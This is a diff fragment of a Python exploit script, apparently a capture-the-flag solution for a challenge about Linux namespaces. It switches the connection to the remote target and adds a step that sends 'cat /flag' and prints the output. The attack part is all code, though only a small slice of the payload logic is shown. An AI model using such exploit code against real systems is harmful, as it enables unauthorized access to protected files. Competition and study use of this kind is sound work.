@@ -86,7 +86,7 @@ PAYLOADS = [
 
 def main():
     build_payloads(PAYLOADS)
-    r = connect_to_local()
+    r = connect_to_remote()
     r.recvuntil(">")
     # send_elf(r, "namespaces")
     # send_elf(r, "busybox")
@@ -98,13 +98,18 @@ def main():
     run_elf(r, 0, "makens")
     time.sleep(3)
     run_elf(r, 0, "sleep")
-    # sleep(1)
+    sleep(1)
+    r.send("2\n0\ncat /flag\n")
+    print(r.recvline())
+    print(r.recvline())
+    print(r.recvline())
+    print(r.recvline())
     # for i in range(10):
     #     r.recvuntil("entering namespaces of pid 2")
     #     # if r.recvline() == b"chal: setresgid: Invalid argument":
     #     r.sendline("cat /flag")
     #     r.recvline()
-    #     run_elf(r,0,"empty")
+        # run_elf(r,0,"empty")
     # wait()
     r.interactive()
 
